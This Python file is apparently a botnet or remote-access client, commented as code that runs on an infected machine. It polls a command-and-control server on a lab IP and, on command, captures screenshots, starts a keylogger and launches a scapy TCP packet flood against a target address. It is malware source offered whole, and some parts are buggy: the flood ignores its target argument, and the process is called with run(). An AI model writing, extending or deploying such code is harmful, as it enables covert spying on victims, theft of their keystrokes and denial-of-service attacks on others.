import socket
import sys
import selectors
import types

from async_timeout import current_task

from client_keylogger import *
import os
import pyautogui
import glob
from datetime import datetime
import time
from multiprocessing import Process
from scapy.all import *

# CODE THAT RUNS ON INFECTED MACHINE WILL GO HERE
def ddos(ip):
    source_IP = str(socket.gethostbyname(socket.gethostname()))
    target_IP = "192.168.56.102"
    source_port = 80
    i = 1

    while True:
        IP1 = IP(src = source_IP, dst = target_IP)
        TCP1 = TCP(sport = source_port, dport = 80)
        pkt = IP1 / TCP1
        send(pkt, inter = .001)
        
        print ("packet sent ", i)
        i = i + 1 

HOST = "192.168.56.103"
PORT = 1234
ddosprocess = Process(target=ddos)

while True:

    # Obtain current task with socket?
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(b"Hello, world")
        data = s.recv(1024)
        task = data.decode('utf-8').split(" ")
        # List of current files and latest file added which we might use for some actions
        list_of_screenshots = glob.glob('*.png')
        if (len(list_of_screenshots) > 0):
            latest_file = max(list_of_screenshots, key=os.path.getctime)

        # Current date to add to filenames
        date = datetime.now().strftime("%d_%m_%Y-%H_%M")
        
        # Takes a screenshot at the python file location
        if task[0] == 'screenshot':
            print("Taking screenshot...")
            PATH = os.path.dirname('task.txt')
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save(PATH + f"screenshot_{date}" + ".png")

        # The keylogger cannot be stopped except by stopping the whole program!!
        elif task[0] == 'keylogger':
            keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
            keylogger.start()
        elif task[0] == 'ddos':
            print("DDOS " + task[1])
            ddosprocess = Process(target=ddos, args=(task[1],))
            ddosprocess.run()
            
        else:
            print("no task done")

    # Obtain current task
    #file = open('task.txt')
    #lines = file.readlines()
    #task = lines[0]
    print("sleep for 10 seconds")
    time.sleep(10)

